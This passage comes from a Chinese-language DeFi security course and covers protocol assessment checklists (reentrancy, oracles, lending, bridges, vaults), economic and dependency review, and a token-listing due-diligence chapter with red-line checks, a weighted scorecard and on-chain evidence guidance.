[\"第二层：规则会不会被套利\"]\n  L1 --&gt; T1[\"通用清单&lt;br/&gt;重入、权限、算术、预言机等\"]\n  L1 --&gt; T2[\"分类型清单&lt;br/&gt;借贷、DEX、金库、跨链等\"]\n  L2 --&gt; T3[\"把协议和依赖的市场一起建模\"]\n  T3 --&gt; E1[\"经济安全评估\"]\n  T3 --&gt; E2[\"外部依赖评估\"]\n  P --&gt; L3[\"还要看：谁能开闸&lt;br/&gt;权限与治理\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>代码层有清单可查，规则层必须连同市场一起建模。<\/li><li><strong>局限：<\/strong>代码清单查不出经济攻击，经济攻击常常每一步都合法。<\/li><li><strong>风险：<\/strong>预言机、被依赖协议、抵押资产未来都可能恶化，评估要考虑这种情况。<\/li><\/ul>\n\n<blockquote class=\"analogy\"><p>🎯 打个比方:评估 DeFi 协议像<strong>检查一座水坝<\/strong>。<\/p>\n<ul>\n<li>先看坝体有没有裂缝（代码漏洞:重入、溢出、权限）。<\/li>\n<li>再看设计:上游水位暴涨时泄洪能力够不够,上游另一座坝垮了会不会连锁（经济安全与外部依赖）。<\/li>\n<li>坝体完好、设计也对,还要看谁能开闸、开闸要几个人同意（权限与治理）。<\/li>\n<\/ul>\n<p>比喻的局限:水坝的上游是固定的。DeFi 协议的&quot;上游&quot;（预言机、被依赖的协议、抵押资产）会变,评估要考虑它们未来恶化的情况。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. 通用清单（所有协议都查）<\/h2>\n<p>按主线章节组织,每一项都对应一个已知事故:<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>类别<\/th>\n<th>检查点<\/th>\n<th>章节<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>重入<\/td>\n<td>外部调用前状态已更新?共享状态共享锁?只读重入?<\/td>\n<td><a href=\"#c03\" data-nav=\"c03\">03<\/a><\/td>\n<\/tr>\n<tr>\n<td>权限<\/td>\n<td>每个改状态函数谁能调用?初始化受保护?升级权限?<\/td>\n<td><a href=\"#c04\" data-nav=\"c04\">04<\/a><\/td>\n<\/tr>\n<tr>\n<td>算术<\/td>\n<td>舍入对协议有利?精度从合约读取?金库首存攻击?<\/td>\n<td><a href=\"#c05\" data-nav=\"c05\">05<\/a><\/td>\n<\/tr>\n<tr>\n<td>外部调用<\/td>\n<td>返回值检查?非标准代币?DoS?持有授权的任意调用?<\/td>\n<td><a href=\"#c06\" data-nav=\"c06\">06<\/a><\/td>\n<\/tr>\n<tr>\n<td>预言机<\/td>\n<td>价格一笔交易内可变?多区块可操纵?时效与上下限?<\/td>\n<td><a href=\"#c07\" data-nav=\"c07\">07<\/a><\/td>\n<\/tr>\n<tr>\n<td>MEV / 签名<\/td>\n<td>minOut 与 deadline?EIP-712 完整?<\/td>\n<td><a href=\"#c08\" data-nav=\"c08\">08<\/a><\/td>\n<\/tr>\n<tr>\n<td>升级<\/td>\n<td>存储布局?实现锁死?时间锁?应急暂停与升级分离?<\/td>\n<td><a href=\"#c09\" data-nav=\"c09\">09<\/a><\/td>\n<\/tr>\n<tr>\n<td>经济<\/td>\n<td>偿付不变量?治理快照?清算激励?延迟与限额?<\/td>\n<td><a href=\"#c10\" data-nav=\"c10\">10<\/a><\/td>\n<\/tr>\n<tr>\n<td>链差异<\/td>\n<td>目标链的行为差异?<\/td>\n<td><a href=\"#k00\" data-nav=\"k00\">C00–C03<\/a><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p>通用清单的落地工具是<a href=\"#c12\" data-nav=\"c12\">审计速查表<\/a>和<a href=\"#lab-chain-porting-lab\" data-nav=\"lab-chain-porting-lab\" class=\"lab-link\">链迁移检查器<\/a>。<\/p>\n<hr>\n<h2>3. 分类型清单<\/h2>\n<p>通用清单之上,每类协议有自己的高发点。<\/p>\n<h3>3.1 借贷协议<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 预言机:抵押品估值用什么价格?低流动性 / 自有代币作抵押品的供应上限与抵押率?(Venus XVS、Inverse)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 清算:极端行情下清算是否仍有利可图?清算折扣有上限?坏账由谁承担?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 健康检查:<strong>所有<\/strong>减少抵押品或增加债务的路径最后都检查健康因子?(Euler 的 <code>donateToReserves<\/code>)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 利率模型:利率是否可被操纵?利用率跳变是否可被闪电贷诱发?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 分叉来源:是否分叉自 Compound/Aave?改了哪些地方?(Fei Rari 改了转账方式)<\/li>\n<\/ul>\n<h3>3.2 DEX / AMM<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 不变量:每次交换后 <code>x·y≥k<\/code>（或对应不变量）是否成立?(Uranium)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 舍入:集中流动性的 tick 边界、再投资计算的舍入方向?(KyberSwap)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 回调:swap 回调是否校验调用者为<strong>计算出的<\/strong>真实池子?(Sushi RouteProcessor2,见 <a href=\"#examples\" data-nav=\"examples\">examples/08<\/a>)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 手续费与价格读数:LP 价格是否可被用作抗操纵预言机?(不能直接用储备算)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 代币兼容:收税、变基、无返回值代币能否破坏池子记账?<\/li>\n<\/ul>\n<h3>3.3 稳定币<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 锚定机制:超额抵押、算法、法币储备?极端脱锚时的清算与赎回路径?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 预言机:锚定价格来源;抵押品价格的熔断上下限?(Venus LUNA)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 铸造 / 销毁权限:谁能增发?有无上限与时间锁?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 死亡螺旋:抵押品与稳定币相关时的反身性(算法稳定币的历史教训)。<\/li>\n<\/ul>\n<h3>3.4 金库 / 收益聚合（ERC-4626）<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 首存者通胀攻击:虚拟份额 / 死份额 / 内部记账?(见 <a href=\"#lab-vault-inflation-lab\" data-nav=\"lab-vault-inflation-lab\" class=\"lab-link\">vault-inflation-lab<\/a>)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 份额价格:<code>totalAssets<\/code> 是否读 <code>balanceOf<\/code>,可被捐赠操纵?(Harvest、Cream)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 策略切换:策略合约能否被替换为恶意合约?谁有权限?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 奖励计算:是否用余额差,且加了重入锁?(Penpie)<\/li>\n<\/ul>\n<h3>3.5 质押 / 流动性质押 / 再质押<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 凭证脱锚风险;赎回延迟队列;延迟期内谁能暂停?(mETH,见 <a href=\"#k03\" data-nav=\"k03\">C03<\/a>)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 多层叠加(质押→再质押→抵押)的风险传导;清算路径是否依赖凭证的二级市场价格?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> Slashing(罚没)风险如何传导给凭证持有人?<\/li>\n<\/ul>\n<h3>3.6 跨链 / 桥<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 消息格式:含源链、源合约、目标链、目标合约、nonce?逐项校验?(Wormhole、Poly)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 验证方式与信任假设:多签阈值与独立性?证明验证代码审计?(Ronin、Token Hub)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 零值 / 初始化:未证明消息不会被当作已证明?(Nomad)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 存款伪造:原生币与 ERC-20 路径分离?无代码地址检查?(Qubit)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 限额与对账:单笔 / 单位时间上限?两侧供应量对账?<\/li>\n<\/ul>\n<h3>3.7 永续 / 衍生品<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 标记价格 / 资金费率的操纵:指数价格来源抗操纵?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 强平与保险基金:极端行情下的自动减仓(ADL)机制?保险基金耗尽时?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 预言机延迟:L2 排序器宕机时的清算?(见 <a href=\"#c07\" data-nav=\"c07\">07<\/a> 5.1)<\/li>\n<\/ul>\n<h3>3.8 账户抽象（ERC-4337 / EIP-7702）<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> ERC-4337:Paymaster 能否被耗尽?UserOp 的签名验证?bundler 的 DoS?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> EIP-7702:委托目标的安全;不再用 <code>tx.origin==msg.sender<\/code>、<code>code.length==0<\/code> 判断调用者(见 <a href=\"#k00\" data-nav=\"k00\">C00<\/a> 4.10)。<\/li>\n<\/ul>\n<hr>\n<h2>4. 经济安全评估<\/h2>\n<p>代码清单查不出经济攻击。经济评估要单独做:<\/p>\n<ol>\n<li><strong>写出协议级不变量<\/strong>(偿付、总量守恒),并用不变量测试验证(见 <a href=\"#a08\" data-nav=\"a08\">A08<\/a>)。<\/li>\n<li><strong>把外部市场纳入模型<\/strong>:假设某个预言机、某个被依赖的协议、某个抵押资产出现极端情况,协议会怎样?<\/li>\n<li><strong>闪电贷视角<\/strong>:攻击者一笔交易内有无限本金。任何&quot;按当前余额 / 价格&quot;计算的量都是攻击者的输入。<\/li>\n<li><strong>治理视角<\/strong>:投票权能否被借?提案能否被同交易执行?(Beanstalk)<\/li>\n<li><strong>参数边界<\/strong>:抵押率、费率、清算折扣、供应上限在边界值和极端值下是否仍安全?<\/li>\n<\/ol>\n<blockquote class=\"info\"><p>💡 注意:经济攻击常常&quot;每一步都合法&quot;。审查要问的不是&quot;这步对不对&quot;,而是&quot;把这些步骤按攻击者喜欢的顺序和规模组合,会怎样&quot;。<\/p>\n<\/blockquote>\n<hr>\n<h2>5. 外部依赖评估<\/h2>\n<p>协议依赖的东西出问题,协议跟着出问题。列一张依赖表:<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>依赖<\/th>\n<th>类型<\/th>\n<th>失效影响<\/th>\n<th>评估<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>预言机<\/td>\n<td>Chainlink / TWAP / 自研<\/td>\n<td>价格错 / 停更<\/td>\n<td>时效、上下限、备用源、排序器状态<\/td>\n<\/tr>\n<tr>\n<td>被集成的协议<\/td>\n<td>借贷 / DEX / 桥<\/td>\n<td>对方被攻破或暂停<\/td>\n<td>集成点:回调、价格、暂停、升级<\/td>\n<\/tr>\n<tr>\n<td>代币<\/td>\n<td>抵押品 / 交易对<\/td>\n<td>代币可暂停 / 黑名单 / 升级 / 脱锚<\/td>\n<td>代币权限;是否映射资产<\/td>\n<\/tr>\n<tr>\n<td>库<\/td>\n<td>OpenZeppelin / Solmate 等<\/td>\n<td>库 bug<\/td>\n<td>版本锁定;关注已知 bug<\/td>\n<\/tr>\n<tr>\n<td>编译器<\/td>\n<td>solc / Vyper<\/td>\n<td>编译器 bug<\/td>\n<td>版本锁定(Vyper 2023)<\/td>\n<\/tr>\n<tr>\n<td>基础设施<\/td>\n<td>RPC / 子图 / keeper<\/td>\n<td>服务中断<\/td>\n<td>降级路径<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>6. 两种评估目标<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th><\/th>\n<th>自研协议<\/th>\n<th>接入第三方协议<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>你能改代码吗<\/td>\n<td>能<\/td>\n<td>不能<\/td>\n<\/tr>\n<tr>\n<td>评估重点<\/td>\n<td>全量:代码 + 经济 + 依赖<\/td>\n<td>集成点 + 对方的信任假设<\/td>\n<\/tr>\n<tr>\n<td>关键问题<\/td>\n<td>上线前把问题修掉<\/td>\n<td>对方被攻破 / 暂停 / 跑路时,我们的资金和用户受什么影响,怎么退出<\/td>\n<\/tr>\n<tr>\n<td>结论<\/td>\n<td>完整报告 + 门禁<\/td>\n<td>接入风险评估 + 限额 + 退出预案<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<div class=\"lv-figcap\"><span>图 · 自研与接入的评估路径<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  Q{\"你能改代码吗？\"}\n  Q --&gt;|\"能：自研协议\"| S1[\"全量评估&lt;br/&gt;代码 + 经济 + 依赖\"]\n  S1 --&gt; S2[\"上线前把问题修掉\"]\n  S2 --&gt; S3[\"完整报告 + 门禁\"]\n  Q --&gt;|\"不能：接入第三方\"| T1[\"评估集成点&lt;br/&gt;和对方的信任假设\"]\n  T1 --&gt; T2[\"假设对方某天会出事\"]\n  T2 --&gt; T3[\"接入风险评估&lt;br/&gt;+ 限额 + 退出预案\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>能否改代码，决定了评估是「修掉问题」还是「控制敞口」。<\/li><li><strong>风险：<\/strong>接入第三方时继承对方全部风险，却没有修复能力。<\/li><li><strong>出错点：<\/strong>只因对方「看起来很大、很成熟」就不设限额和退出机制。<\/li><\/ul>\n\n<blockquote class=\"warn\"><p>⚠️ 警告:接入第三方协议时,你继承了对方的全部风险,却没有修复能力。评估要假设对方某天会出事,并设计限额、监控和退出机制,而不是依赖&quot;它看起来很大、很成熟&quot;。<\/p>\n<\/blockquote>\n<hr>\n<h2>7. 术语表<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>不变量<\/td>\n<td>Invariant<\/td>\n<td>任何操作后都必须成立的条件<\/td>\n<\/tr>\n<tr>\n<td>健康因子<\/td>\n<td>Health Factor<\/td>\n<td>加权抵押品价值与借款价值之比<\/td>\n<\/tr>\n<tr>\n<td>反身性<\/td>\n<td>Reflexivity<\/td>\n<td>价格变化通过机制反过来强化价格变化<\/td>\n<\/tr>\n<tr>\n<td>自动减仓<\/td>\n<td>ADL<\/td>\n<td>保险基金不足时强制减少盈利方仓位<\/td>\n<\/tr>\n<tr>\n<td>集成点<\/td>\n<td>Integration Point<\/td>\n<td>本协议调用外部协议的具体位置<\/td>\n<\/tr>\n<tr>\n<td>退出预案<\/td>\n<td>Exit Plan<\/td>\n<td>外部依赖出事时撤出资金的预设流程<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>8. 思考题<\/h2>\n<ol>\n<li>一个借贷协议新增了一个&quot;一键循环杠杆&quot;功能。按 3.1 的清单,你会重点检查哪几项?为什么循环杠杆是高风险功能?<\/li>\n<li>你要评估是否把交易所的理财资金接入某个成熟的收益协议。按第 6 节,你的结论应该包含哪些内容?<\/li>\n<li>一个金库协议说&quot;我们用内部变量记账,不读 balanceOf,所以没有通胀攻击&quot;。你还需要验证什么才能认同这个结论?<\/li>\n<\/ol>\n<p>下一章：<a href=\"#a05\" data-nav=\"a05\">A05 上币与合作项目尽调<\/a><\/p>\n"}, "a05": {"id": "a05", "file": "assessment/A05-listing-due-diligence.md", "title": "A05 上币与合作项目尽调", "group": "asm", "html": "<h1>A05 上币与合作项目尽调<\/h1>\n<blockquote class=\"\"><p>学习目标：读完本章，你能——<\/p>\n<ol>\n<li>在 1–5 个工作日内,对一个上币或合作项目做出&quot;风险是否可接受&quot;的结论。<\/li>\n<li>用一张评分卡,从合约权限、链上数据、团队运营、经济模型四个维度给项目打分。<\/li>\n<li>识别貔貅盘、可增发、隐藏后门、虚假锁仓等&quot;必须一票否决&quot;的红线。<\/li>\n<\/ol>\n<p>前置章节：<a href=\"#c04\" data-nav=\"c04\">04 访问控制<\/a>、<a href=\"#c06\" data-nav=\"c06\">06 外部调用<\/a>、<a href=\"#a02\" data-nav=\"a02\">A02 评级<\/a><br>交互实验：<a href=\"#lab-listing-scorecard\" data-nav=\"lab-listing-scorecard\" class=\"lab-link\">listing-scorecard.html<\/a> ｜ 模板：<a href=\"#t05\" data-nav=\"t05\">T05 上币尽调问卷<\/a><\/p>\n<\/blockquote>\n<hr>\n<h2>1. 一句话理解<\/h2>\n<p><strong>上币尽调不是审计。你审不完对方的代码,也改不了它。你的任务是用有限的时间,判断&quot;上了这个币,用户和交易所会不会遭受不可接受的损失&quot;。<\/strong><\/p>\n<blockquote class=\"analogy\"><p>🎯 打个比方：上币尽调像<strong>租客背景调查<\/strong>。<\/p>\n<ul>\n<li>你不会把房客的人生查个底朝天(没时间,也没权力)。<\/li>\n<li>你查几件决定性的事:他能不能按时付租(经济模型)、有没有前科(链上劣迹)、这房子他会不会转手就卖(可增发、可转移所有权)、钥匙还在谁手里(权限与锁仓)。<\/li>\n<li>任何一条踩红线,直接拒绝,不需要查完其余。<\/li>\n<\/ul>\n<p>比喻的局限:房客一般不会主动伤害你。上币尽调要假设项目方可能就是攻击者本人(貔貅盘、跑路盘)。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. 尽调的四个维度<\/h2>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  P[&quot;上币 / 合作申请&quot;] --&gt; D1[&quot;① 合约权限&lt;br/&gt;谁能动代币和资金&quot;]\n  P --&gt; D2[&quot;② 链上数据&lt;br/&gt;部署、持仓、流动性、历史&quot;]\n  P --&gt; D3[&quot;③ 团队与运营&lt;br/&gt;身份、安全实践、审计&quot;]\n  P --&gt; D4[&quot;④ 经济模型&lt;br/&gt;代币分配、释放、用途&quot;]\n  D1 &amp; D2 &amp; D3 &amp; D4 --&gt; R{&quot;有红线?&quot;}\n  R -- 是 --&gt; NO[&quot;一票否决&quot;]\n  R -- 否 --&gt; SCORE[&quot;评分卡打分 → 风险结论&quot;]<\/pre><\/div>\n<p><strong>读图要点:<\/strong><\/p>\n<ul>\n<li>红线检查在打分之前。任何一个维度踩红线,直接否决,不进入评分。<\/li>\n<li>四个维度的证据来源不同:① ④ 看代码和文档,② 看链上,③ 靠问卷和公开信息。<\/li>\n<li>局限:尽调的结论有时效。代币合约可升级、可增发时,今天的结论明天可能失效——这本身就是一条高风险项。<\/li>\n<\/ul>\n<hr>\n<h2>3. 红线清单（任一命中即否决或暂缓）<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>红线<\/th>\n<th>怎么查<\/th>\n<th>为什么是红线<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>可无限增发且无时间锁<\/td>\n<td>读 <code>mint<\/code> 权限;检查 owner / minter<\/td>\n<td>项目方可随时稀释,等于随时跑路<\/td>\n<\/tr>\n<tr>\n<td>貔貅盘(能买不能卖)<\/td>\n<td>在分叉环境模拟买入后卖出;检查转账税、黑名单、暂停<\/td>\n<td>用户资金只进不出<\/td>\n<\/tr>\n<tr>\n<td>owner 可暂停 / 冻结任意地址转账<\/td>\n<td>读代币合约的 pause / blacklist<\/td>\n<td>项目方可定点冻结,包括交易所热钱包<\/td>\n<\/tr>\n<tr>\n<td>隐藏的所有权转移或升级后门<\/td>\n<td>审代理、<code>delegatecall<\/code>、未初始化、selfdestruct<\/td>\n<td>合约行为可被悄悄改变<\/td>\n<\/tr>\n<tr>\n<td>代理可升级且升级权是单签 EOA<\/td>\n<td>读实现槽、admin 槽、权限<\/td>\n<td>单点被盗即全盘失控<\/td>\n<\/tr>\n<tr>\n<td>锁仓 / 流动性锁是假的<\/td>\n<td>核验锁仓合约地址、解锁时间、LP 是否真锁<\/td>\n<td>虚假锁仓 = 随时砸盘 / 撤池<\/td>\n<\/tr>\n<tr>\n<td>合约与官网 / 审计报告中的地址不一致<\/td>\n<td>逐一核对地址<\/td>\n<td>常见的调包手法<\/td>\n<\/tr>\n<tr>\n<td>代码与已验证源码不一致<\/td>\n<td>浏览器核对验证状态;比对字节码<\/td>\n<td>部署的不是审计的<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"warn\"><p>⚠️ 警告:红线检查要在<strong>对方给出的部署地址<\/strong>上做,不是在 GitHub 仓库上做。部署的合约才是用户会交互的合约(Nomad、调包手法)。<\/p>\n<\/blockquote>\n<hr>\n<h2>4. 四维评分<\/h2>\n<p>红线通过后,用评分卡打分(去 <a href=\"#lab-listing-scorecard\" data-nav=\"lab-listing-scorecard\" class=\"lab-link\">listing-scorecard.html<\/a> 交互打分并导出)。<\/p>\n<h3>4.1 维度与权重（示例）<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>维度<\/th>\n<th>权重<\/th>\n<th>主要评分项<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>① 合约权限<\/td>\n<td>30%<\/td>\n<td>增发 / 暂停 / 升级权限的持有方(EOA / 多签 / 时间锁 / 已放弃);权限最小化程度<\/td>\n<\/tr>\n<tr>\n<td>② 链上数据<\/td>\n<td>25%<\/td>\n<td>部署时长;持仓集中度(前 10 地址占比);流动性深度与锁定;历史异常交易<\/td>\n<\/tr>\n<tr>\n<td>③ 团队与运营<\/td>\n<td>25%<\/td>\n<td>身份公开度;私钥与多签实践;是否有审计;审计方与范围;漏洞赏金<\/td>\n<\/tr>\n<tr>\n<td>④ 经济模型<\/td>\n<td>20%<\/td>\n<td>代币分配;解锁曲线;是否有反身性 / 庞氏结构;收益来源是否可持续<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h3>4.2 每项的打分锚点（示例,0–4 分）<\/h3>\n<p>以&quot;① 升级权限持有方&quot;为例:<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>分<\/th>\n<th>情形<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>4<\/td>\n<td>不可升级,或升级权已放弃(renounce)<\/td>\n<\/tr>\n<tr>\n<td>3<\/td>\n<td>多签 + 时间锁(≥48h)<\/td>\n<\/tr>\n<tr>\n<td>2<\/td>\n<td>多签无时间锁,或时间锁较短<\/td>\n<\/tr>\n<tr>\n<td>1<\/td>\n<td>单签多方,或时间锁 &lt;24h<\/td>\n<\/tr>\n<tr>\n<td>0<\/td>\n<td>单签 EOA,可无延迟升级<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意:权重和锚点是示例。交易所应按自身风险偏好和上币层级(主区 / 创新区 / 观察区)设定,并固定下来,保证不同项目口径一致。评分卡的价值在于<strong>一致性<\/strong>,不在于绝对数值。<\/p>\n<\/blockquote>\n<h3>4.3 从分数到结论<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>综合结论<\/th>\n<th>建议<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>高分、无红线<\/td>\n<td>可上线<\/td>\n<\/tr>\n<tr>\n<td>中分<\/td>\n<td>附条件:限额、观察区、加强监控、要求补审计或锁仓<\/td>\n<\/tr>\n<tr>\n<td>低分或有未解决的高风险<\/td>\n<td>暂缓,列出需补充的材料与整改项<\/td>\n<\/tr>\n<tr>\n<td>任一红线<\/td>\n<td>否决<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<div class=\"lv-figcap\"><span>图 · 从红线到上币结论<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  RL{\"红线检查\"} --&gt;|\"任一命中\"| NO[\"否决\"]\n  RL --&gt;|\"全部通过\"| SC[\"四维评分&lt;br/&gt;合约权限 30% · 链上数据 25%&lt;br/&gt;团队运营 25% · 经济模型 20%\"]\n  SC --&gt; Q{\"综合结论\"}\n  Q --&gt;|\"高分、无红线\"| UP[\"可上线\"]\n  Q --&gt;|\"中分\"| CO[\"附条件上线\"]\n  CO --&gt; C1[\"限额 / 观察区&lt;br/&gt;加强监控&lt;br/&gt;补审计或锁仓\"]\n  Q --&gt;|\"低分或高风险未解决\"| HOLD[\"暂缓\"]\n  HOLD --&gt; H1[\"列出需补充的材料&lt;br/&gt;与整改项\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>红线在打分之前：一条红线就能推翻再高的分数。<\/li><li><strong>数据流：<\/strong>通过红线后，四维得分按权重汇总，再落到四种结论之一。<\/li><li><strong>局限：<\/strong>权重和锚点只是示例，交易所要按自身风险偏好和上币层级定下来。<\/li><li><strong>关键：<\/strong>评分卡的价值在于不同项目口径一致，不在于绝对数值。<\/li><\/ul>\n\n<hr>\n<h2>5. 链上数据怎么查<\/h2>\n<p>尽调中最省时、最难造假的证据来自链上:<\/p>\n<div class=\"lv-figcap\"><span>图 · 链上证据与危险信号<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  A1[\"部署信息\"] --&gt; B1[\"刚部署几天\"]\n  A2[\"源码验证\"] --&gt; B2[\"未验证或字节码不一致\"]\n  A3[\"持仓集中度\"] --&gt; B3[\"前 10 地址占比高&lt;br/&gt;砸盘风险\"]\n  A4[\"流动性\"] --&gt; B4[\"浅池易被操纵\"]\n  A5[\"权限地址\"] --&gt; B5[\"单签 EOA\"]\n  A6[\"历史行为\"] --&gt; B6[\"关联跑路史&lt;br/&gt;或黑客地址\"]\n  A7[\"锁仓真实性\"] --&gt; B7[\"假锁仓\"]\n  B1 &amp; B2 &amp; B3 &amp; B4 &amp; B5 &amp; B6 &amp; B7 --&gt; R[\"风险升高&lt;br/&gt;减分或触发红线\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>数据流：<\/strong>证据来自浏览器、holders 列表、DEX 池和锁仓合约，都能自己查。<\/li><li><strong>关键：<\/strong>链上证据最省时，也最难造假。<\/li><li><strong>风险：<\/strong>单签 EOA 持有权限、假锁仓，都意味着项目方随时能动用户的钱。<\/li><li><strong>出错点：<\/strong>对方给的审计报告不能直接采信，要核验审计方、版本和已确认风险。<\/li><\/ul>\n\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>查什么<\/th>\n<th>怎么查<\/th>\n<th>关注<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>部署信息<\/td>\n<td>浏览器看创建交易、创建者、时间<\/td>\n<td>刚部署几天的项目风险高<\/td>\n<\/tr>\n<tr>\n<td>源码验证<\/td>\n<td>浏览器的 verified 状态;比对字节码<\/td>\n<td>未验证 / 不一致是危险信号<\/td>\n<\/tr>\n<tr>\n<td>持仓集中度<\/td>\n<td>holders 列表;前 10 / 前 50 占比<\/td>\n<td>高度集中 = 砸盘风险<\/td>\n<\/tr>\n<tr>\n<td>流动性<\/td>\n<td>DEX 池深度;LP 代币持有与锁定<\/td>\n<td>浅池易被操纵(见 <a href=\"#c07\" data-nav=\"c07\">07<\/a>)<\/td>\n<\/tr>\n<tr>\n<td>权限地址<\/td>\n<td>读 owner / admin / minter;看它是 EOA 还是多签<\/td>\n<td>单签 EOA 是减分项<\/td>\n<\/tr>\n<tr>\n<td>历史行为<\/td>\n<td>关联地址的历史;是否与已知劣迹地址交互<\/td>\n<td>跑路史、黑客地址关联<\/td>\n<\/tr>\n<tr>\n<td>锁仓真实性<\/td>\n<td>核验锁仓合约、金额、解锁时间<\/td>\n<td>假锁仓<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意:对方提供的审计报告要独立核验——审计方是否可信、审计的是不是这个版本、报告里的&quot;已确认风险&quot;是什么。一份审计报告不等于安全(PancakeBunny 被利用的是审计后上线的新版本)。<\/p>\n<\/blockquote>\n<hr>\n<blockquote class=\"info\"><p>💡 注意：钱包里常见的 Audit 页是自动扫描，不是人工审计。它怎么来、能发现什么，见实例 <a href=\"#a10\" data-nav=\"a10\">A10 币安 Audit 页分析<\/a>。<\/p>\n<\/blockquote>\n<h2>6. 团队运营安全问卷<\/h2>\n<p>近年交易所和项目方的最大损失来自运营环节(见 <a href=\"#a06\" data-nav=\"a06\">A06<\/a>)。合作项目的运营安全直接影响交易所,尤其是深度合作(共同部署、共享金库、提供流动性)。用 <a href=\"#t05\" data-nav=\"t05\">T05 问卷<\/a> 了解:<\/p>\n<ul>\n<li>私钥 / 多签的管理方式;签名人数量与独立性;是否用硬件钱包 / MPC / HSM。<\/li>\n<li>部署与升级流水线;CI 密钥管理。<\/li>\n<li>前端托管、DNS、域名、npm 依赖的保护。<\/li>\n<li>团队对社会工程(假招聘、假承包商)的防范意识。<\/li>\n<li>是否有应急响应预案与暂停能力。<\/li>\n<\/ul>\n<p>问卷答案无法完全核实,但&quot;答不上来&quot;或&quot;没有任何措施&quot;本身就是风险信号。<\/p>\n<hr>\n<h2>7. 尽调交付物<\/h2>\n<p>C 类尽调的交付物短小、可执行:<\/p>\n<ol>\n<li><strong>一页结论<\/strong>:上 / 附条件上 / 暂缓 / 否决,加一句话理由。<\/li>\n<li><strong>评分卡<\/strong>:四维得分 + 红线检查结果。<\/li>\n<li><strong>上线条件<\/strong>(如附条件):限额、观察区、监控、锁仓、补审计等。<\/li>\n<li><strong>证据附录<\/strong>:链上地址、权限读数、持仓截图、问卷答案。<\/li>\n<\/ol>\n<hr>\n<h2>8. 术语表<\/h2>\n<div 